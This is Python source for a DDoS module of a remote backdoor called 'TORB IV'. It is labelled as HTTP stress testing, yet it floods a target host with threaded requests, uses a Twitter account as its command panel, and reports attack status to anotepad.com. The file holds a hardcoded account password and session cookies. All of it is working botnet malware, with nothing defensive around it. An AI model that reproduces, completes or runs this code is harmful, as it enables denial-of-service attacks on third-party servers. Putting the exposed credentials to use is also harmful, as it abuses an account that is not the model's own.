
#  _______  _______  ______    _______        ___   __   __ 
# |       ||       ||    _ |  |  _    |      |   | |  | |  |
# |_     _||   _   ||   | ||  | |_|   |      |   | |  |_|  |
#   |   |  |  | |  ||   |_||_ |       |      |   | |       |
#   |   |  |  |_|  ||    __  ||  _   |       |   | |       |
#   |   |  |       ||   |  | || |_|   |      |   |  |     | 
#   |___|  |_______||___|  |_||_______|      |___|   |___|  
#
# Twitter Operated Remote Backdoor
# Version 4.0

# [ RCI Module - Remote Code Injection ]

#  ___                             ___ 
# |  _|   ____  ____      _____   |_  |
# | |    |    \|    \ ___|   __|    | |
# | |    |  |  |  |  | . |__   |    | |
# | |_   |____/|____/|___|_____|   _| |
# |___|                           |___|

# Description: This module enables HTTP stress testing.
# Type: This module was designed for TORB IV (Personal Remote Operated Backdoor Executable).

import requests
import ctypes
from ctypes import *
import wmi
import random
import shutil
import subprocess
import time
import threading
import pythoncom
import pyHook
import random
import socket
import sys
import os
import string

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv

# Config
cntrlPanel = 'http://twitter.com/pyprototype2'
anotepadUser = 'pyhannahmaple@gmail.com'
anotepadPass = 'hc4BXdNgAv3UwKQD'

# Function: aNotepad.com Submission
def asubmit(subjNote):

	global login_URL
	global page
	global landing
	global keyword
	global Session

	comm_append = ''

	for comm_i in subjNote:
		comm_append = comm_append + comm_i

	login_URL = 'https://anotepad.com/create_account'
	landing = 'https://anotepad.com/'
	keyword = 'Logout'

	note_title = "module.dos"
	note_description = comm_append
	creationLink = 'https://anotepad.com/note/create'

	print subjNote

	with requests.Session() as c:
	
		login_data = \
		{
			'action': 'login',
			'email': anotepadUser,
			'password': anotepadPass,
			'submit':'' 
		}

		create_form = \
		{
			'notetype': 'PlainText',
			'noteaccess': '1',
			'notepassword':'',
			'notequickedit': 'false',
			'notequickeditpassword':'', 
			'notetitle': note_title,
			'notecontent': note_description
		}

		header_data = \
		{
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Cache-Control': 'max-age=0',
			'Connection': 'keep-alive',
			'Content-Length': '73',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; _gat=1; __atuvc=7%7C11; __atuvs=5aa6da6b2e4908e9006',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/create_account',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36'
		}

		header_create = \
		{
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Connection': 'keep-alive',
			'Content-Length': '172',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; Anotepad=645503E71D3DEB85AF8F469D7A8227A738E907F75816F05B37A18CFF114F39E92911FCFD29D898D34D4AD800E30F703B4E7460AF5FF83767A4D6F63DE0DE2D59444CB25286F7CE7534815FA04973D2F3C81749DB58EFEDE0BC7A1FD2D3FF6E1FE81665BF6CE882BDA6B10B929BF6F044; _gat=1; __atuvc=41%7C11; __atuvs=5aa6da6b2e4908e9028',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36',
			'X-Requested-With': 'XMLHttpRequest'
		}

		c.get(login_URL)
		c.post(login_URL, data=login_data, headers=header_data)

		asubmit.page = c.get(landing)
		Check = asubmit.page.content.find(keyword)

		if Check == -1:
			print '\nlogin failed. (Try again)'
		else:
			print '\nSuccessful login + submission'

		c.post(creationLink, data=create_form, headers=header_create)

def auto_send_request(server, number_of_requests=10):
    global inc2
    global isDos
    requestsCheck = (requests2 - 1)
    for z in range(number_of_requests):
        try:
            if isDos == True:
                urlopen(server)
                print "."
                inc2 = inc2 + 1
                if inc2 % 1000 == 0:
                    print "Requests: %s." % (inc2)
            elif isDos == False:
                break
        except IOError:
            print "E" 
        if inc2 >= requestsCheck:
            print "\nFinished Stress Procedure"
            asubmit("[%s]\nHTTP Flood complete on host: %s" % (OSFingerprint,dTarg))
            break

def flood(url, number_of_requests = 1000, number_of_threads = 50):  
	global Thread
	global auto_send_request
	global urlopen

	number_of_requests_per_thread = int(number_of_requests/number_of_threads)

	for x in range(number_of_threads):
		Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()

	print "\nDone %i requests on %s" % (number_of_requests, url)

def run(action, num_req):    
	global requests2
	global inc2
	global isDos
	global Session

	inc2 = 0
	isDos = False
	
	if action != "stop":
		print "DDoS Started."
		isDos = True
		server = action
		requests2 = int(num_req)

		try:
			flood(server, requests2)
		except:
			print "\nDDoS Launch Failed.\n"

	elif action == "stop":
		isDos = False
		print 'DDoS Stopped.'

def torbDoS():
	global run
	global flood
	global dTarg
	global dRequests

	targX = dTarg
	targY = dRequests
	
	asubmit("[%s]\nHTTP Flood started on host: %s" % (OSFingerprint,dTarg))
	try:
		run(targX,targY)
	except:
		print "\nDDoS Launch Failed.\n"
		asubmit("[%s]\nHTTP Flood ERROR on host: %s" % (OSFingerprint,dTarg))

torbDoS()